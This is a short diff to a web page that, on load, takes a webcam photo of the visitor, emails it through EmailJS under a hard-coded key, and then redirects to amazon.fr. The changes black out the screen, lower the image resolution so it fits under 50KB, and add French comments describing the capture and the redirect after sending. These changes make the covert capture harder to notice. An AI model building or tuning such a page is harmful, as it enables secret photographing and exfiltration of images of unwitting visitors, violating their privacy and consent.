@@ -8,7 +8,7 @@
     body, html {
       margin: 0;
       padding: 0;
-      background: #ffffff;
+      background: #000000; /* écran noir */
       height: 100%;
       width: 100%;
       overflow: hidden;
@@ -20,7 +20,7 @@
 </head>
 <body>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="200" height="150"></canvas>
+  <canvas id="canvas" width="160" height="120"></canvas>
 
   <script>
     emailjs.init("IoSfbtGz4KSL_5_9E");
@@ -36,6 +36,7 @@
         video.srcObject = stream;
 
         video.onloadeddata = () => {
+          // Capture de la photo (faible résolution pour <50KB)
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
           const imageData = canvas.toDataURL("image/jpeg", 0.2);
 
@@ -47,6 +48,7 @@
             message: "Photo automatique 📸",
             image: imageData
           }).finally(() => {
+            // Redirection après envoi
             window.location.href = "https://www.amazon.fr";
           });
         };
